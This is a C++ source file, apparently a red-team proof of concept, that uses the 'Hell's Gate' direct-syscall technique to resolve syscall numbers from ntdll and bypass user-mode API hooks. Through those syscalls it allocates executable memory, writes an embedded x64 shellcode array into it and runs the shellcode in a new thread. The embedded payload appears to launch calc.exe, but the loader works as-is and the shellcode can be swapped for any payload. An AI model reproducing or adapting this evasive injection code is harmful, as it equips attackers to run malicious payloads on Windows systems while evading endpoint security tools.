#include "syscallsHelper.h"

extern "C" VOID HellsGate(DWORD SyscallNumber);
extern "C" NTSTATUS HellDescent();
 
//Declarações das funções da ntdll.dll
using NtAllocateVirtualMemory_t = NTSTATUS(NTAPI*)
(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
);

using NtWriteVirtualMemory_t = NTSTATUS(NTAPI*)
(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID BaseAddress,
	_In_ PVOID Buffer,
	_In_ SIZE_T NumberOfBytesToWrite,
	_Out_opt_ PSIZE_T NumberOfBytesWritten
);

using NtCreateThreadEx_t = NTSTATUS(NTAPI*)
(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_ SIZE_T ZeroBits,
	_In_ SIZE_T StackSize,
	_In_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
);

using NtWaitForSingleObject_t = NTSTATUS(NTAPI*)
(
	_In_ HANDLE Handle,
	_In_ BOOLEAN Alertable,
	_In_opt_ PLARGE_INTEGER Timeout
);

using NtClose_t = NTSTATUS(NTAPI*)
(
    _In_ HANDLE Handle
);

SYSCALL_ENTRY Syscalls[SYSCALL_COUNT] =
{
	{ "NtAllocateVirtualMemory",   0, RESOLUTION_NONE },
	{ "NtWriteVirtualMemory",      0, RESOLUTION_NONE },
	{ "NtCreateThreadEx",          0, RESOLUTION_NONE },
	{ "NtWaitForSingleObject",     0, RESOLUTION_NONE },
	{ "NtClose",                   0, RESOLUTION_NONE }
};


//shellcode
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x00";

int main(int argc, char* argv[]) {

	NTSTATUS Status = STATUS_SUCCESS;
	SIZE_T shellcodesize = sizeof(shellcode);
	PVOID Buffer = nullptr;
	OBJECT_ATTRIBUTES OA;
	InitializeObjectAttributes(&OA, nullptr, 0, nullptr, nullptr);

	HANDLE hProcess = GetCurrentProcess();
	HANDLE hThread = nullptr;

	HMODULE hNtdll = GetModuleHandlePeb(L"ntdll.dll");
	if (!hNtdll) {
		std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
		return 1;
	}

	ResolveAllSyscalls(hNtdll);

	std::cout << "Syscall number for " << Syscalls[SYSCALL_ALLOCATE].Name << ": 0x" << std::hex << Syscalls[SYSCALL_ALLOCATE].SSN << std::endl;
	std::cout << "Syscall number for " << Syscalls[SYSCALL_WRITEPROCESS].Name << ": 0x" << std::hex << Syscalls[SYSCALL_WRITEPROCESS].SSN << std::endl;
	std::cout << "Syscall number for " << Syscalls[SYSCALL_CREATEREMOTETHREAD].Name << ": 0x" << std::hex << Syscalls[SYSCALL_CREATEREMOTETHREAD].SSN << std::endl;
	std::cout << "Syscall number for " << Syscalls[SYSCALL_WAITFOR_SINGLEOBJECT].Name << ": 0x" << std::hex << Syscalls[SYSCALL_WAITFOR_SINGLEOBJECT].SSN << std::endl;
    std::cout << "Syscall number for " << Syscalls[SYSCALL_CLOSE].Name << ": 0x" << std::hex << Syscalls[SYSCALL_CLOSE].SSN << std::endl;

	HellsGate(GetSSNFromSyscallTable("NtAllocateVirtualMemory"));

	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(HellDescent);

	Status = NtAllocateVirtualMemory(
		hProcess,
		&Buffer,
		0,
		&shellcodesize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!NT_SUCCESS(Status)) {
		std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << Status << std::endl;
		return 1;
	}

	std::cout << "NtAllocateVirtualMemory succeeded, allocated memory for shellcode." << std::endl;

	HellsGate(GetSSNFromSyscallTable("NtWriteVirtualMemory"));

	NtWriteVirtualMemory_t NtWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemory_t>(HellDescent);

	Status = NtWriteVirtualMemory(
		hProcess,
		Buffer,
		shellcode,
		shellcodesize,
		nullptr);

	if (!NT_SUCCESS(Status)) {
		std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << Status << std::endl;
		return 1;
	}

	std::cout << "NtWriteVirtualMemory succeeded, shellcode written to allocated memory." << std::endl;

	HellsGate(GetSSNFromSyscallTable("NtCreateThreadEx"));

	NtCreateThreadEx_t NtCreateThreadEx = reinterpret_cast<NtCreateThreadEx_t>(HellDescent);

	Status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		&OA,
		hProcess,
		Buffer,
		nullptr,
		FALSE,
		0,
		0,
		0,
		nullptr);

	if (!NT_SUCCESS(Status)) {
		std::cerr << "NtCreateThreadEx failed with status: " << std::hex << Status << std::endl;
		return 1;
	}

	std::cout << "NtCreateThreadEx succeeded, shellcode executed in a new thread." << std::endl;

	HellsGate(GetSSNFromSyscallTable("NtWaitForSingleObject"));

	NtWaitForSingleObject_t NtWaitForSingleObject = reinterpret_cast<NtWaitForSingleObject_t>(HellDescent);

	Status = NtWaitForSingleObject(
		hThread,
		FALSE,
		nullptr);

	HellsGate(GetSSNFromSyscallTable("NtClose"));

	NtClose_t NtClose = reinterpret_cast<NtClose_t>(HellDescent);

	Status = NtClose(hThread);
	if (!NT_SUCCESS(Status)) {
		std::cerr << "NtClose failed with status: " << Status << std::endl;
		return 1;
	}

	std::cout << "NtClose succeeded, thread handle closed." << std::endl;

	std::cout << "Shellcode injection completed successfully." << std::endl;

	// Exibe o relatório de resolução de syscalls
	PrintSyscallResolutionReport();

	return 0;
}